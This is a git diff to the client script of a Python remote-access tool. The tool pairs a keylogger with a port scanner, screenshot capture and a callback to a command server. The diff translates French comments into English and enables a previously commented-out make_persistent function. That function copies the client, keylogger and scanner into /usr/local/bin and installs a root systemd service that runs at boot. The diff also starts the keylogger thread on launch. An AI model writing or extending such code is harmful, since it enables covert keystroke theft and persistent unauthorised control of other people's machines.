@@ -8,7 +8,7 @@ from scanner import p_arg, s_arg
 from keylogger import log_keystrokes, start_keylogger, send_keylogs
 import threading
 
-HOST = '192.168.137.7'  # change that to the IP address of the server
+HOST = '127.0.0.1'  # change that to the IP address of the server
 PORT = 9999  # change that to the port of the server
 
 
@@ -31,7 +31,7 @@ def screenshot(data_stream):
 
 def execute_scanner(args):
     """
-    Exécute le scanner avec les arguments donnés et retourne les résultats.
+   scanner function
     """
     try:
         if args[0] == "-p":
@@ -40,28 +40,38 @@ def execute_scanner(args):
             ports = [21, 22, 80]
             results = s_arg(ports)
         else:
-            results = ["Commande non reconnue pour le scanner."]
+            results = ["wrong arguments"]
         
         return "\n".join(str(result) for result in results) if results else "Aucun résultat."
     except Exception as e:
-        return f"Erreur lors de l'exécution du scanner : {e}"
+        return f"Error : {e}"
 
 
-''' PERSISTENCE FUNCTION
 
 def make_persistent():
     """
-    Configure le script client pour qu'il s'exécute automatiquement en tant que service root au démarrage.
+    make the script persistent
     """
     service_path = "/etc/systemd/system/client.service"
     persistent_path = "/usr/local/bin/client.py"
-
+    persistent_path_key = "usr/local/bin/keylogger.py"
+    persistent_path_scan = "usr/local/bin/scanner.py"
     try:
         # Copier le script actuel dans un emplacement persistant
         current_script = os.path.realpath(__file__)
+        current_dir = os.path.dirname(current_script)
+        keylog_script = "keylogger.py"
+        keylog_path = os.path.join(current_dir, keylog_script)
+        scan_script = "scanner.py"
+        scan_path = os.path.join(current_dir, scan_script)
+
         if not os.path.exists(persistent_path):
             os.system(f"cp {current_script} {persistent_path}")
             os.system(f"chmod +x {persistent_path}")
+            os.system(f"cp {keylog_path} {persistent_path_key}")
+            os.system(f"chmod +x {persistent_path_key}")
+            os.system(f"cp {scan_path} {persistent_path_scan}")
+            os.system(f"chmod +x {persistent_path_scan}")
         
         # Créer un fichier de service systemd
         service_content = f"""
@@ -91,7 +101,6 @@ WantedBy=multi-user.target
     except Exception as e:
         print(f"Erreur dans make_persistent : {e}")
 
-'''
 
 
 def connect_to_server(): 
@@ -135,7 +144,7 @@ def connect_to_server():
 
 if __name__ == "__main__":
 
-    #make persistent()
+    make_persistent()
     keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
     keylogger_thread.start()
     connect_to_server()
